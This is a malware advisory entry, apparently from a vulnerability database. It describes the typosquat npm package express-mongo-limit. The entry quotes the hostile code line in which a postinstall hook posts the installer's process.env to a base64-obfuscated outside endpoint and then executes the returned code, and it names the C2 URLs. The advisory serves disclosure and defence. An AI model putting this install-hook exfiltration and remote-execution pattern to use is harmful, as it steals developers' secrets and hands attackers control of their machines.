summary: express-mongo-limit exfiltrates process.env and executes remote code at install time
details: package.json declares a postinstall hook that runs `node index.js`. On install, the loaded module posts the installer's entire `process.env` object to a base64-obfuscated endpoint that decodes to https://gamboracle.vercel.app/api via `axios.post(api, {...process.env }, { headers: { 'x-app-request': 'ip-check' } })`, then passes the HTTP response body directly into `new Function('require', response.data)` and invokes it with `require` injected — giving the remote endpoint arbitrary Node code execution with full module access on the installer machine. The C2 URL is stored as a base64 literal and decoded with `atob` at runtime; a secondary base64-encoded endpoint decoding to https://ipcheck-six.vercel.app/api is present in the shipped.env. The package name imitates the well-known `express-mongo-sanitize` library while the README is an unrelated `hello-world-package` stub, consistent with typosquat-with-divergent-behavior packaging.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
